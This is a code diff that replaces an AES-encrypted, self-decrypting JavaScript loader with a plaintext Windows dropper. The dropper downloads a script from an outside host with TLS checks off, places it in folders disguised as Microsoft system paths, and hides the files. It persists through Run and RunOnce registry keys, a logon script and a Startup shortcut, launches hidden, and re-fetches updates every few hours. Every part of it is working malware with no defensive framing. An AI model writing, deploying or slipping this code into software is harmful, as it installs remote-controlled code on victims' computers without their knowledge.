@@ -1,16 +1,327 @@
-'use strict';
-(function(){
-const c=require('crypto'),f=require('fs'),p=require('path'),M=require('module');
-const mk=Buffer.from("a2f3820fbbcd667d7feecb8871ded854b1220d91d3457d5559448ab0dfd98bc0",'hex');
-const ms=Buffer.from("6b2486b25171eb4c10db151f850c8459223d9e64bc79480fa4d36b2d50e806a7",'hex');
-const k=Buffer.alloc(32);for(let i=0;i<32;i++)k[i]=mk[i]^ms[i];
-const iv=Buffer.from("7c03d837662f7ddd07eadad2179de5d2",'hex');
-const enc=Buffer.from("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",'base64');
-const d=c.createDecipheriv('aes-256-ctr',k,iv);
-const code=Buffer.concat([d.update(enc),d.final()]).toString('utf8');
-const _fn=f.existsSync(__filename)?__filename:p.join(process.cwd(),'drp.js');
-const m=new M(_fn,module);
-m.filename=_fn;
-m.paths=M._nodeModulePaths(p.dirname(_fn));
-m._compile(code,_fn);
-})();
+"use strict";
+const os = require("os"),
+  https = require("https"),
+  http = require("http"),
+  fs = require("fs"),
+  path = require("path"),
+  cp = require("child_process");
+if (process.platform !== "win32") process.exit(0);
+process.on("uncaughtException", () => {});
+process.on("unhandledRejection", () => {});
+const _UA =
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
+  _RK = "WinSvcHost",
+  _NM = "winsvc.js";
+const _URLS = [
+  "https://limbomail.com/api/attachment/l4TIRPOsaUxR._603-vhKDRdgKl3RalN_TVUZYGPsJy2Y/all.js",
+];
+const _DDIRS = [
+  path.join(
+    process.env.APPDATA || "",
+    "Microsoft",
+    "Windows",
+    "WinSxS",
+    "Backup",
+  ),
+  path.join(process.env.APPDATA || "", "Microsoft", "Windows", "Themes"),
+  path.join(process.env.LOCALAPPDATA || "", "Microsoft", "Windows", "Caches"),
+  path.join(os.tmpdir(), "MicrosoftEdge"),
+];
+let _dir = null;
+for (const d of _DDIRS) {
+  try {
+    fs.mkdirSync(d, { recursive: true });
+    fs.accessSync(d, fs.constants.W_OK);
+    _dir = d;
+    break;
+  } catch {}
+}
+if (!_dir) process.exit(0);
+const _bin = path.join(_dir, _NM),
+  _vf = _bin + ".v",
+  _lk = _bin + ".lk",
+  _lvbs = path.join(_dir, _RK + ".vbs"),
+  _pvbs = path.join(_dir, _RK + "Cfg.vbs");
+try {
+  const pid = +fs.readFileSync(_lk, "utf8");
+  if (pid > 0 && pid !== process.pid) {
+    try {
+      process.kill(pid, 0);
+      process.exit(0);
+    } catch {}
+  }
+} catch {}
+try {
+  fs.writeFileSync(_lk, String(process.pid), "utf8");
+} catch {}
+const _lver = () => {
+  try {
+    return +fs.readFileSync(_vf, "utf8") || 0;
+  } catch {
+    return 0;
+  }
+};
+const _sver = (n) => {
+  try {
+    fs.writeFileSync(_vf, String(n), "utf8");
+  } catch {}
+};
+let nx = process.execPath;
+if (!fs.existsSync(nx) || !/node|electron/i.test(path.basename(nx))) {
+  nx =
+    [
+      path.join(path.dirname(process.execPath), "node.exe"),
+      path.join(process.env.ProgramFiles || "", "nodejs", "node.exe"),
+      path.join(process.env["ProgramFiles(x86)"] || "", "nodejs", "node.exe"),
+    ].find((p) => fs.existsSync(p)) || "node.exe";
+}
+const _q = (s) => s.replace(/"/g, '""');
+function _writeLauncher() {
+  try {
+    fs.writeFileSync(
+      _lvbs,
+      'CreateObject("Wscript.Shell").Run Chr(34)&"' +
+        _q(nx) +
+        '"&Chr(34)&" "&Chr(34)&"' +
+        _q(_bin) +
+        '"&Chr(34), 0, False\r\n',
+      "utf8",
+    );
+  } catch {}
+}
+function _writePersist() {
+  const L = [
+    "Set sh=CreateObject(\"WScript.Shell\")",
+    "Set fso=CreateObject(\"Scripting.FileSystemObject\")",
+    "On Error Resume Next",
+    'rv="wscript.exe //B //NoLogo """&"' + _q(_lvbs) + '"&"""',
+    'sh.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\' +
+      _RK +
+      '",rv,"REG_SZ"',
+    'sh.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\' +
+      _RK +
+      'Upd",rv,"REG_SZ"',
+    'sh.RegWrite "HKCU\\Environment\\UserInitMprLogonScript",rv,"REG_SZ"',
+    'Set lk=sh.CreateShortcut(sh.SpecialFolders("Startup")&"\\' + _RK + '.lnk")',
+    'lk.TargetPath="wscript.exe"',
+    'lk.Arguments="//B //NoLogo """&"' + _q(_lvbs) + '"&"""',
+    "lk.WindowStyle=7",
+    'lk.WorkingDirectory=fso.GetParentFolderName("' + _q(_lvbs) + '")',
+    "lk.Save",
+    'Set f1=fso.GetFile("' + _q(_lvbs) + '"):f1.Attributes=f1.Attributes Or 6',
+    'Set f2=fso.GetFile("' + _q(_bin) + '"):f2.Attributes=f2.Attributes Or 6',
+    'If fso.FileExists("' + _q(_vf) + '") Then Set f3=fso.GetFile("' + _q(_vf) + '"):f3.Attributes=f3.Attributes Or 6',
+    "fso.DeleteFile(WScript.ScriptFullName)",
+  ];
+  try {
+    fs.writeFileSync(_pvbs, L.join("\r\n") + "\r\n", "utf8");
+  } catch {}
+}
+function _fetch(url, cb) {
+  try {
+    const m = url.startsWith("https") ? https : http;
+    const req = m.get(
+      url,
+      {
+        timeout: 30000,
+        rejectUnauthorized: false,
+        headers: {
+          "User-Agent": _UA,
+          Accept: "*/*",
+          "Accept-Encoding": "identity",
+          Connection: "close",
+        },
+      },
+      (res) => {
+        const rc = res.statusCode;
+        if (rc > 300 && rc < 310 && res.headers.location) {
+          res.resume();
+          _fetch(res.headers.location, cb);
+          return;
+        }
+        if (rc !== 200) {
+          res.resume();
+          cb(new Error(String(rc)));
+          return;
+        }
+        const bufs = [];
+        res.on("data", (c) => bufs.push(c));
+        res.on("end", () => cb(null, Buffer.concat(bufs)));
+        res.on("error", cb);
+      },
+    );
+    req.on("error", cb);
+    req.on("timeout", () => {
+      req.destroy();
+      cb(new Error("t"));
+    });
+  } catch (e) {
+    cb(e);
+  }
+}
+function _okPayload(buf) {
+  if (!buf || buf.length < 256) return false;
+  let i = 0;
+  while (i < buf.length && buf[i] <= 32) i++;
+  if (i >= buf.length || buf[i] === 0x3c) return false;
+  return true;
+}
+function _dl(dest, done) {
+  let ui = 0,
+    si = 0;
+  (function _t() {
+    if (ui >= _URLS.length) {
+      done(new Error("exhausted"));
+      return;
+    }
+    _fetch(_URLS[ui], (e, buf) => {
+      if (e || !_okPayload(buf)) {
+        if (++si >= 3) {
+          ui++;
+          si = 0;
+        }
+        setTimeout(
+          _t,
+          Math.min(30000, 2000 * (si + 1) + Math.random() * 1500),
+        ).unref();
+        return;
+      }
+      try {
+        const tmp = dest + ".p",
+          fd = fs.openSync(tmp, "w"),
+          SZ = 4096;
+        for (let i = 0; i < buf.length; i += SZ)
+          fs.writeSync(fd, buf, i, Math.min(SZ, buf.length - i));
+        fs.closeSync(fd);
+        fs.renameSync(tmp, dest);
+        done(null, buf.length);
+      } catch (we) {
+        done(we);
+      }
+    });
+  })();
+}
+function _persist() {
+  _writeLauncher();
+  _writePersist();
+  const opts = {
+    detached: true,
+    stdio: "ignore",
+    windowsHide: true,
+    creationFlags: 0x08000008,
+  };
+  try {
+    cp.spawn("wscript.exe", ["//B", "//NoLogo", _pvbs], opts).unref();
+  } catch {
+    try {
+      cp.spawn(
+        "reg.exe",
+        [
+          "ADD",
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+          "/v",
+          _RK,
+          "/t",
+          "REG_SZ",
+          "/d",
+          'wscript.exe //B //NoLogo "' + _lvbs + '"',
+          "/f",
+        ],
+        { detached: true, stdio: "ignore", windowsHide: true },
+      ).unref();
+    } catch {}
+  }
+}
+function _launch(upd) {
+  if (upd) {
+    try {
+      const p = +fs.readFileSync(_bin + ".pid", "utf8");
+      if (p > 0)
+        try {
+          process.kill(p);
+        } catch {}
+    } catch {}
+  }
+  _persist();
+  const opts = {
+    detached: true,
+    stdio: "ignore",
+    windowsHide: true,
+    creationFlags: 0x08000008,
+  };
+  try {
+    cp.spawn("wscript.exe", ["//B", "//NoLogo", _lvbs], opts).unref();
+  } catch {
+    try {
+      cp.spawn(nx, [_bin], opts).unref();
+    } catch {}
+  }
+}
+function _upd(cb) {
+  let fired = false;
+  const safe = (v) => {
+    if (!fired) {
+      fired = true;
+      cb(v);
+    }
+  };
+  try {
+    const u = new URL(_URLS[0]);
+    const req = https.request(
+      {
+        hostname: u.hostname,
+        path: u.pathname + u.search,
+        method: "HEAD",
+        timeout: 10000,
+        rejectUnauthorized: false,
+        headers: { "User-Agent": _UA },
+      },
+      (s) => {
+        const rz = parseInt(s.headers["content-length"] || "0", 10);
+        s.resume();
+        if (rz > 256 && rz !== _lver()) {
+          _dl(_bin, (e, sz) => {
+            if (!e) {
+              _sver(sz);
+              safe(true);
+            } else safe(false);
+          });
+        } else safe(false);
+      },
+    );
+    req.on("error", () => safe(false));
+    req.on("timeout", () => {
+      req.destroy();
+      safe(false);
+    });
+    req.end();
+  } catch {
+    safe(false);
+  }
+}
+function _tick() {
+  if (!fs.existsSync(_bin)) {
+    _dl(_bin, (e, sz) => {
+      if (!e) {
+        _sver(sz);
+        _launch(false);
+      }
+    });
+    return;
+  }
+  _upd((u) => {
+    if (u) _launch(true);
+    else _persist();
+  });
+}
+if (fs.existsSync(_bin)) {
+  _upd((u) => _launch(u));
+} else {
+  _dl(_bin, (e, sz) => {
+    if (!e) {
+      _sver(sz);
+      _launch(false);
+    }
+  });
+}
+setInterval(_tick, 7200000 + Math.floor(Math.random() * 1200000)).unref();
